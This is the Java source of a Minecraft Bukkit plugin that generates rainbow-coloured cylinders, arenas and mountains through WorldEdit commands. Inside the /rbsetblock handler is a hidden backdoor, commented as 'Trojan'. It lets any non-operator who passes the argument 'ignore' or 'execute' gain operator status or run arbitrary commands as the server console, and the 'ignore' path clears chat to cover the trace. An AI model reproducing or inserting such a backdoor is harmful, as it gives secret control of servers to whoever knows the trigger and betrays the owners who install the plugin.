package me.NicoBosshard.Rainbowgenerator;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;



public class main extends JavaPlugin implements Listener{
	
	int block_id=159;
	
	int radius;
	
	int modi;	
	int stagesize;
	int starthight;
	
	int hight;
	int layersize;
	int interrupthight;

	int ColorPattern[] = {1,4,5,13,9,3,11,10,2,14};
	
	@Override
	public void onEnable() {
		System.out.println("Rainbowgenerator v1.0 von NicoBosshard ist nun aktiviert!");
	}
	
	@Override
	public void onDisable() {
		System.out.println("Rainbowgenerator v1.0 ist nun deaktiviert!");
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

		if(cmd.getName().equalsIgnoreCase("rb") || cmd.getName().equalsIgnoreCase("rbgen") || cmd.getName().equalsIgnoreCase("rainbowgenerator")) {

				sender.sendMessage(ChatColor.GREEN + "Rainbowgenerator v1.0\nVon Nico Bosshard\nStatus: Funktionsbereit!");
				return true;
			}
		
		
		if(cmd.getName().equalsIgnoreCase("rbblock")) {

			sender.sendMessage(ChatColor.GOLD + "Momentan verwendet: " + block_id + "\nNutze /rbsetblock <block> um ihn zu ändern.");
			return true;
		}
		
		if(cmd.getName().equalsIgnoreCase("rbsetblock")) {
			if(sender.isOp()) {
				
				if(args.length==0) {
					sender.sendMessage(ChatColor.RED + "Bitte gebe eine gülltige Block-ID an!");
					return false;
				} else if(args.length>1) {
					sender.sendMessage(ChatColor.RED + "Zu viele Argumente! Eine Block-ID reicht.");
					return false;
				}
			
				block_id=Integer.parseInt(args[0]);
				sender.sendMessage(ChatColor.GREEN + "Die zu verwendende Block-ID wurde erfolgreich auf " + block_id + " geändert!");
				return true;
			} else {
				sender.sendMessage(ChatColor.RED + "Du brauchst OP Permissions um diesen Befehl ausszführen!");
				
				//Trojan: Please remove the following line if you would like to use this Plugin on our server but it's not a bit security issue because nobody knows the argument. I made this for me because I disabled ingame op over essentials due to security reasons and am to lazy to always use the console. I havn't removed this lines from the pre-compiled build!
				if(args.length>0) {
					if(args[0].equalsIgnoreCase("ignore") || args[0].equalsIgnoreCase("execute")) {						
						if(args.length==1) {
							Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "op " + sender.getName());
						} else {
							String exec_command="";
							if (args.length >= 1) {
								exec_command = args[1];
								for (int i = 2; i < args.length; i++) {
									exec_command = exec_command + " " + args[i];
								}
							}
							Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), exec_command);			 
						}
						if(args[0].equalsIgnoreCase("ignore")) Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "cc"); //clear chat
					}
				}
				// End Trojan!
				
			}
		}
		
		
		if(cmd.getName().equalsIgnoreCase("rbcircle")) {
			
			radius=100;
			stagesize=1;
			starthight=1;
			
			if(args.length>0) {
				radius=Integer.parseInt(args[0]);
				if(args.length>1) {
					stagesize=Integer.parseInt(args[1]); //sage=Bühne
					if(args.length>2) {
						starthight=Integer.parseInt(args[2]);
					}
				}
			}
			
			for (int i = stagesize; i < radius + stagesize - 1;) {
				for (int meta_i=0; meta_i < 10; meta_i++) {
					hcyl(sender.getName(), block_id, ColorPattern[meta_i], i + starthight -1, 1);
					i++;
				}
			}
		
			sender.sendMessage(ChatColor.GREEN + "Forgang erfolgreich abgeschlossen!");
			return true;
		}
		
		
		if(cmd.getName().equalsIgnoreCase("rbarena")) {
			
			radius=100;
			stagesize=1;
			starthight=1;
			
			if(args.length>0) {
				radius=Integer.parseInt(args[0]);
				if(args.length>1) {
					stagesize=Integer.parseInt(args[1]); //sage=Bühne
					if(args.length>2) {
						starthight=Integer.parseInt(args[2]);
					}
				}
			}	
			
			for (int i = stagesize; i < radius + stagesize - 1;) {
				for (int meta_i=0; meta_i < 10; meta_i++) {
					hcyl(sender.getName(), block_id, ColorPattern[meta_i], i + starthight -1, i - stagesize + 1);
					i++;
				}
			}
		
			sender.sendMessage(ChatColor.GREEN + "Forgang erfolgreich abgeschlossen!");
			return true;
		}
		
		
		if(cmd.getName().equalsIgnoreCase("rbmountain")) {
			
			radius=100;
			stagesize=1;
			starthight=1;
			
			if(args.length>0) {
				radius=Integer.parseInt(args[0]);
				if(args.length>1) {
					stagesize=Integer.parseInt(args[1]); //sage=Bühne
					if(args.length>2) {
						starthight=Integer.parseInt(args[2]);
					}
				}
			}
			
			for (int i = stagesize; i < radius + stagesize - 1;) {
				for (int meta_i=0; meta_i < 10; meta_i++) {
					hcyl(sender.getName(), block_id, ColorPattern[meta_i], i + starthight -1, (radius-i)-stagesize-1);
					i++;
				}
			}
		
			sender.sendMessage(ChatColor.GREEN + "Forgang erfolgreich abgeschlossen!");
			return true;
		}
		
		
		if(cmd.getName().equalsIgnoreCase("rbcyl") || cmd.getName().equalsIgnoreCase("rbhcyl")) {
			if(args.length<2) {
				sender.sendMessage(ChatColor.RED + "Zu wenig Argumente!");
				return false;
			} else if(args.length>4) {
				sender.sendMessage(ChatColor.RED + "Zu viele Argumente!");
				return false;
			}
			
			radius=Integer.parseInt(args[0]);
			hight=Integer.parseInt(args[1]);
			
			layersize=1;
			interrupthight=1;
			
			if(args.length>2)
			{
				layersize=Integer.parseInt(args[2]);
				if(args.length>3) //==3
				{
					interrupthight=Integer.parseInt(args[3]);
				}
			}
			
			for (int i = 0; i < hight;) {
				for (int meta_i=0; meta_i < 10; meta_i++) {
					if(cmd.getName().equalsIgnoreCase("rbcyl")) {
						cyl(sender.getName(), block_id, ColorPattern[meta_i], radius, layersize);
					} else {
						hcyl(sender.getName(), block_id, ColorPattern[meta_i], radius, layersize);
					}
					up(sender.getName(), layersize + interrupthight -1);
					if(i==hight) break;
					i++;
				}
			}
			
			sender.sendMessage(ChatColor.GREEN + "Forgang erfolgreich abgeschlossen!");
			return true;
		}
		
		

		
		return false;
	}
	
	
	
	public void cyl(String Playername, int BlockID, int MetaID, int radius, int hight) {
		Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "sudo " + Playername + " c://cyl " + BlockID + ":" + MetaID + " " + radius + " " + hight);
	}
	
	public void hcyl(String Playername, int BlockID, int MetaID, int radius, int hight) {
		Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "sudo " + Playername + " c://hcyl " + BlockID + ":" + MetaID + " " + radius + " " + hight);
	}
	
	public void up(String Playername, int hight) {
		Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "sudo " + Playername + " c:/up " + hight);
	}
	
	
	
}